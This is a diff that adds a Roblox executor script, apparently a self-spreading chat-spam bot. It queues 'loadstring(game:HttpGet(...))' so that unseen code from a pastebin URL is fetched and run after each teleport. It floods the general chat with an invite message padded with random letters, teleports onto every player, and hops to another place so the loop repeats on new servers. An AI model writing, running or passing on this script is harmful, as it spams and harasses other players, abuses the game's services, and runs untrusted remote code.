@@ -1,0 +1,26 @@
+queue_on_teleport("loadstring(game:HttpGet('https://pastebin.com/raw/3CzFnQ7R'))()")
+
+local player = game.Players.LocalPlayer
+local min, max, final = ("a"):byte(), ("z"):byte(), ""
+
+
+local function generatestring()
+	for i = 1, 15 do
+		print(string.char(math.random(min, max)))
+		final = final.. string.char(math.random(min, max))
+	end
+end
+
+while true do task.wait()
+	for _, indexedPlayer in game.Players:GetPlayers() do
+		task.wait(0.8)
+		generatestring()
+
+		game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Join ntcj2Dv4 | "..final.."")
+		if (indexedPlayer.Character and  indexedPlayer.Character:FindFirstChild("HumanoidRootPart")) then
+			player.Character.HumanoidRootPart.CFrame = 	indexedPlayer.Character.HumanoidRootPart.CFrame
+		end
+	end
+
+		game:GetService("TeleportService"):Teleport(1068523756, game.Players.LocalPlayer)
+end
